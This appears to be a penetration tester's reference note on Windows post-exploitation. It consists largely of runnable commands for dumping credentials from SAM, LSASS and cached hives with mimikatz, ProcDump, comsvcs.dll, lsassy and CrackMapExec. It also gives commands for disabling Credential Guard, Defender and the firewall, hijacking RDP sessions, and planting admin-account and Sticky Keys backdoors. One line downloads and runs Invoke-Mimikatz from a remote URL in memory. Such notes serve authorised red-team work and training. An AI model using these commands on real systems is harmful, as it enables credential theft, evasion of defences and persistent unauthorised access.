# Windows - Post exploitation

Post exploitation is the phase of operation once a target host has been
compromised, usually by gaining local Administrator / SYSTEM access.

Post exploitation should consist of:

  - Retrieving local and domain accounts as well as any sensible information
  stored on the compromised hosts
  - Implementing a way of persistence on the compromised host

### Credentials dumping

Credential dumping is the process of obtaining account login and password
information, normally in the form of a hash or a clear text password, from
the operating system.

On Windows, the users password are stored in the:

  - SAM (Security Account Manager) hive, storing the LM/NTLM hashes of local
    accounts for the host.
  - LSASS (Local Security Authority Subsystem) process, caching clear-text
    passwords or LM/NTLM hashes of logged on users, Kerberos tickets, etc.
  - Cached domain credentials hive, storing MsCache / MsCacheV2 hashes of
    domain accounts in order to allow re-logon on the machine even if a domain
    controller is not reachable. By default, the last 10 accounts used to logon
    are stored.  
  - NTDS.dit (NT Directory Services.Directory Information Tree) file, which is
    the main AD database file, stored on Domain Controllers and containing,
    notably, the NTLM hashes of all domain accounts.  
  - Generic credentials are defined and authenticated by programs that manage
    authorization and security directly. The generic credentials are cached in
    the Credential Manager.

Administrators / SYSTEM privileges are required to access the information
stored in those files / processes.

Refer to the `[General] File transfer` note for methods to transfer the dump
files from the compromised machine.

###### [SAM/mscachev2] Registries dump

The Windows built-in `req` can be used to dump the SAM and cached domain
credentials hives:

```
# Number of cached credentials in MsCache / MsCacheV2
reg query "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\Current Version\Winlogon\"

# If the registry key is not defined, but the following SecEdit is, the number of cached credentials is restricted through a security policy inf file
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SecEdit\Reg Values\MACHINE/Software/Microsoft/Windows NT/CurrentVersion/Winlogon/CachedLogonsCount"

reg save hklm\sam <PATH_SAM_FILE>
reg save hklm\system <PATH_SYSTEM_FILE>
reg save hklm\security <PATH_SECURITY_FILE>
```

The Linux tool `samdump2` can be used to extract the credentials from the SAM
hive on a Linux system:

```
samdump2 <SYSTEM_FILE> <SAM_FILE>
```

The `impacket`'s `secretsdump.py` Python script can be used to extract the
credentials both from the SAM and cached domain credentials hives:

```
secretsdump.py -sam <SAM> -security <SECURITY> -system <SYSTEM>
```

`Mimikatz` can be used as well:

```
# PowerShell in memory injection
# If the compromised host can not access internet, Invoke-Mimikatz.ps1 should be hosted on a local website on the attacking machine
(New-Object System.Net.WebClient).Proxy.Credentials =  [System.Net.CredentialCache]::DefaultNetworkCredentials
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "lsadump::sam" "lsadump::cache" "token::revert"';

mimikatz.exe privilege::debug token::elevate lsadump::sam lsadump::cache exit
```

###### Microsoft Credentials Guard

Credential Guard is a virtualization-based isolation technology for the
`LSASS` which prevents introduced with Microsoft's Windows 10 (Enterprise
edition).

When Credentials Guard is activated, an `LSAIso` (*LSA Isolated*) process is
created in `Virtual Secure Mode`, a feature that leverages the virtualization
extensions of the CPU to provide added security of data in memory. Access to
the `LSAIso` process are restricted even for an access with the SYSTEM security
context. When processing a hash, the `LSA` process perform a `RPC` call to
the `LSAIso` process, and waits for the `LSAIso` result to continue. Thus, the
`LSASS` process won't contain any secrets and in place will store `LSA
Isolated Data`.

The PowerShell `Get-CimInstance` can be used to check if Credential Guard is
running:

```
# Credential Guard is running if SecurityServicesConfigured contains 1
Get-CimInstance –ClassName Win32_DeviceGuard –Namespace root\Microsoft\Windows\DeviceGuard
```

If Credential Guard was enabled with `UEFI Lock`, the settings are persisted in
EFI (firmware) variables and disabling Credential Guard will require
a physical session. Note that if Credential Guard was not enabled with
`UEFI Lock` it can be disabled through a network session and will require a
reboot of the machine.

```
# 0 Disables Credential Guard.
# 1 Enables Credential Guard.
# 2 Enables Credential Guard without making it persist to the UEFI.
REG QUERY "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "LsaCfgFlags"

# Disabling Credential Guard
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v "LsaCfgFlags" /t REG_DWORD /d 0 /f
REG ADD "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Device Guard" /v EnableVirtualizationBasedSecurity /d 0 /f /t REG_DWORD
```

###### [LSASS] Task manager

Since Vista, the `Task Manager` GUI utility tool can be used to easily dump the
LSASS process. To open the task manager while in a RDP session type `taskmgr`
in a command prompt.

The procedure to dump the LSASS process using the task manager is as follow:

```
Details -> Right click "lsass.exe" -> Create Dump File
```

###### [LSASS] comsvcs.dll

The Windows built-in DLL `comsvcs.dll` exposes the `MiniDump` function that can
be leveraged to dump the LSASS process. The `rundll32` Windows built-in
utility can be used to load the `comsvcs.dll` DLL and run the `MiniDump`
function.

Note that the process conducting the dump must have `debug privileges`
enabled, which is by default the case of `PowerShell` process run from an
elevated context.

```
tasklist /FI "imagename eq lsass.exe"
Get-Process lsass | Ft Id

rundll32 C:\windows\system32\comsvcs.dll MiniDump <LSASS_PID> "<PATH_LSASS_DUMP>" full
powershell -c rundll32 C:\windows\system32\comsvcs.dll MiniDump <LSASS_PID> "<PATH_LSASS_DUMP>" full
```

###### [LSASS] ProcDump

`ProcDump` is a command-line utility tool signed by Microsoft and part of the
`sysinternals` suite.

It can be used to dump the LSASS process with out raising any antivirus alert on
all Windows operating systems.

```
procdump.exe -accepteula -ma lsass.exe <PATH_LSASS_FILE>
rm <PATH_LSASS_FILE>

# Trough a meterpreter session
upload <PATH/procdump.exe> C:
execute -f "C:\procdump.exe" -a '-accepteula -ma lsass.exe <PATH_LSASS_DUMP>'
download <PATH_LSASS_DUMP>
rm <PATH_LSASS_DUMP>
```

###### [LSASS] Dumpert

https://github.com/outflanknl/Dumpert
TODO

###### [LSASS] lsassy

The Python utility and library `lsassy` can be used to remotely extract
credentials using the two techniques above. `Lsassy` tries to dump the `lsass`
process on the remote host, and then parses the `lsass` dump remotely.

In addition to using the `comsvcs.dll` DLL with `rundll32.exe` and uploading
and executing `procdump.exe`, `lsassy` will try lastly upload and execute
`dumpert.exe`.

```
# As a standalone CLI utility
# TARGETS = IP(s), range(s), CIDR(s), hostname(s), FQDN(s), file(s) containing a list of targets
lsassy [-d <DOMAIN>>] -u <USERNAME> -p <PASSWORD> --format pretty <TARGETS>
lsassy [-d <DOMAIN>] -u <USERNAME> -H <NTLMHASH> --format pretty <TARGETS>

# As a Python library
from lsassy.core import Lsassy

lsassy = Lsassy(hostname="<HOSTNAME | IP>", username="<USERNAME>", domain="<DOMAIN>", password="<PASSWORD>")
credentials = lsassy.get_credentials()
for credential in credentials:
    [...]
```

###### [LSASS/SAM] Mimikatz

`Mimikatz` can be used to extract plaintexts passwords, hash, PIN code and
kerberos tickets from memory.  

It can be used:

  - By uploading the mimikatz released binary on the targeted system, which will
  almost certainly raise an antivirus alert
  - By uploading a custom mimikatz binary on the targeted system, which may
  raise an antivirus alert
  - Through the injection in memory of the `Invoke-mimikatz` PowerShell script
  (with CME or manually), which may raise an antivirus alert
  - Through a `meterpreter` session by using the `mimikatz` or kiwi modules,
  which may raise an antivirus alert
  - By extracting the LSASS process with the `Task Manager` or `ProcDump`
  utilities and using `mimikatz` off target  

```
mimikatz # log <LOG_FILE>

# Direct use
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
mimikatz # lsadump::lsa /inject
mimikatz # lsadump::lsa /inject /user:krbtgt

# From a LSASS dump
mimikatz # privilege::debug
mimikatz # sekurlsa::minidump <LSASS_FILE>
mimikatz # sekurlsa::logonpasswords

# PowerShell in memory injection
# If the compromised host can not access internet, Invoke-Mimikatz.ps1 should be hosted on a local website on the attacking machine
(New-Object System.Net.WebClient).Proxy.Credentials =  [System.Net.CredentialCache]::DefaultNetworkCredentials
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds;
```

###### [SAM/LSASS] Meterpreter

The `meterpreter` module `hashdump` can be used to dump the SAM base on a
compromised host:

```
meterpreter> hashdump
```

The `Metasploit` module `post/windows/gather/lsa_secrets` can be used to dump
the LSASS secrets trough a `meterpreter` session:

```
msf> use post/windows/gather/lsa_secrets
```

The `meterpreter` extensions `mimikatz` and `kiwi` can be used to dump
credentials through a `meterpreter` session without the need to write any file
to the compromised host's disks. The `kiwi` extension replace the previous
`mimikatz` extension with a much simpler interface command system and works on
Windows XP SP3 and Windows 2003 SP1 all the way up to 10 and 2016.

On x64 host, make sure that the `meterpreter` session is running as a 64 bits
process (using `sysinfo`), otherwise `meterpreter` will attempt to load a 32bit
version of `Mimikatz` into memory, which will cause most features to be
non-functional.  

```
meterpreter> load kiwi
meterpreter> creds_all
meterpreter> lsa_dump_sam
meterpreter> lsa_dump_secrets
meterpreter> creds_kerberos / creds_msv / creds_ssp / creds_tspkg / creds_wdigest    

# Older version
meterpreter> load mimikatz

meterpreter> mimikatz_command -f samdump::hashes
meterpreter> mimikatz_command -f sekurlsa::logonpasswords
meterpreter> kerberos / livessp / msv / ssp / tspkg / wdigest  
```

###### [SAM/LSASS] CrackMapExec

`CrackMapExec` is a framework to pentest Windows/Active Directory environments.
It can be used to dump the SAM base or the LSASS process remotely using local or
domain administrator credentials in the form of password or hash (for the
default local Administrator account and the domain accounts) if the SMB port
is exposed.  

For more information about `CrackMapExec` refer to the `[Active Directory]
Credentials theft shuffle` note.  

Usage:

```
# SAM
crackmapexec <TARGETS> --sam (-d <DOMAIN> | --local-auth) -u <USERNAME> (-p <PASSWORD | PASSWORDS_FILE> | -H <HASH>)

# LSASS dump
crackmapexec <TARGETS> -M mimikatz (-d <DOMAIN> | --local-auth) -u <USERNAME> (-p <PASSWORD | PASSWORDS_FILE> | -H <HASH>)
```

###### SecureString

If an encrypted standard string of a PowerShell  `SecureString` object is
compromised, from a file for example, the `SecureString` can be directly
re used:

```
$user = "<WORKGROUP | DOMAIN>\<USERNAME>";
$pass = "<SECURESTRING>" | ConvertTo-SecureString;
$creds = New-Object System.Management.Automation.PSCredential($user,$pass)

# Plaintext password can then be retrieved  
$creds.GetNetworkCredential() | fl
```

The PowerShell credentials object can now be passed to cmdlets supporting it,
such as `Start-Process` / `Start-Job` or `Invoke-Command` / `Enter-PSSession`.

Note that if the `SecureString` object was created using a plaintext password,
instead of using a `Key` / `SecureKey`, the stored standard string can only be
converted to a `SecureString` object by the account, local or domain joined,
that created the `SecureString` initially. Otherwise, the following error
message will be returned:  

```
ConvertTo-SecureString : Key not valid for use in specified state.
```

###### Generic credentials

TODO

###### RDP Session Hijacking

If Administrator / SYSTEM privileges could be obtained on a host, RDP sessions
of others users can be hijacked. This could be used to access the
host as the hijacked user through a GUI interface with out knowing its password.

Note that:
  - Hijacking of disconnected sessions is possible
  - Hijacking a session will unlock locked sessions (with out the need to
    provide credentials)

Retrieve the ID of the eventual RDP sessions present on the host:

```
# SESSIONNAME = rdp-*
query user
```

Create and start a service that will execute `tscon` to hijack the specified RDP
session:

```
sc create sesshijack binpath= "cmd.exe /k tscon <SESSION_ID> /dest:<SESSION_NAME>"
net start sesshijack
```

### Network

The following commands can be used to retrieve information about the network
interfaces and active connections of the host:

|  | DOS | Powershell | WMI |
|--|-----|------------|-----|
| Network interfaces | ipconfig | | |
| Listening ports | netstat -ano | Get-NetTCPConnection <br/>Get-NetUDPEndpoint | |
| ARP table | arp -a  |   |   |

### Manage

###### Windows Defender

The following Powershell command can be used to switch off Windows Defender
real-time protection:

```
Set-MpPreference -DisableRealtimeMonitoring $true
```

###### Windows Firewall

To check whether the Windows Firewall is enabled on a server or computer,
the following command can be used as Administrator/SYSTEM:

```
# Show the profile applied to each network adapter
netsh advfirewall monitor show currentprofile

# Windows Firewall state for all profile (Public / Domain / Private)
netsh advfirewall show allprofiles
Get-NetFirewallProfile

# Show all rules for the given profile
netsh advfirewall firewall show rule profile=<public | private | domain | any | ...> name=all
Get-NetFirewallProfile -Name <Public | Private | Domain | * | ...> | Get-NetFirewallRule
```

By default, three separate listings are present: Domain profile settings,
private profile settings and public profile settings.  
With the private profile, applied to a network adapter when it is connected
to a network that is identified by the user or administrator as a private
network, Windows enables network discovery features, allows file sharing and
other networked features.   
The public profile, applied to a network adapter by default or if specified so
by an user or administrator, is the most restrictive profile. In the default
public profile, Windows will block all inbound connections to programs that are
not on the list of allowed programs.   
Finally, the Domain profile is used when a server or computer is joined to an
Active Directory domain. In this environment, firewall settings are typically
(but not necessarily) controlled by a network administrator.

Windows blocks inbound connections and allows outbound connections for all
profiles by default.

To disable the firewall use the following commands:

```
# Disable current profile
netsh advfirewall set currentprofile state off

# Disable all profiles
netsh advfirewall set allprofiles state off

# Disable the private, public and domain profiles
netsh advfirewall set privateprofile state off
netsh advfirewall set publicprofile state off
netsh advfirewall set domainprofile state off
```

To open a specific port, or a range, use the following command:

```
netsh advfirewall firewall add rule name="<RULE_NAME" protocol=TCP dir=in localport=<PORT> action=allow
```

###### Activate RDP

RDP can be enabled / disabled with out the need to restart the system with the
`reg` utility:

```
# Check if RDP is enabled
netstat /p tcp /a | findstr 3389
# If RDP is enabled, registry value should be equal to 0x0
reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections

# Enable RDP
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes

# Disable RDP
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f
```

### Persistence

###### Add local Administrator

The following `net user` commands can be used to create and add a windows
account in the administrator group:

```
# Create a new account
net user /add <USERNAME> <PASSWORD>

# Add account as administrator
net localgroup Administrators <USERNAME> /add
net localgroup Administrateurs <USERNAME> /add
```

###### Grant user RDP access

To access a host remotely in RDP, the user used must be present in the "Remote
Desktop Users" localgroup on the host. The following `net localgroup` commands
can be used to add the specified user in this group:

```
net localgroup "Remote Desktop Users" <USERNAME> /add
net localgroup "Utilisateurs du Bureau à distance" <USERNAME> /add

# Connect in RDP from Linux
rdesktop -k fr -g 90% -d '<DOMAIN>' -u '<USERNAME>' -p '<PASSWORD>' <HOSTNAME | IP>
```

###### Sticky Keys or Utilman backdoors

Both the `Sticky Keys` (sethc.exe) and `Utilman` (utilman.exe) utility tools
can be launched at the login screen before authentication as NT
AUTHORITY\SYSTEM.

Replacing either of those binaries with `cmd.exe` can be a way to maintain
persistence on the compromised system.

```
cd windows\system32
copy cmd.exe sethc.exe
copy cmd.exe utilman.exe
```

The `sethc.exe` is launched after pushing the Maj key five times and the
`utilman.exe` can be started using Win + u.

However, a graphical access to the host login prompt is needed in order to
make use of this backdoor mechanism.  

To do so remotely:

  - RDP must be enabled and not firewalled on the host
  - RDP NLA deactivated if no valid credentials are known (credentials of a
    user in the Remote Desktop Users group).

###### WMI

TODO
https://www.blackhat.com/docs/us-15/materials/us-15-Graeber-Abusing-Windows-Management-Instrumentation-WMI-To-Build-A-Persistent%20Asynchronous-And-Fileless-Backdoor-wp.pdf
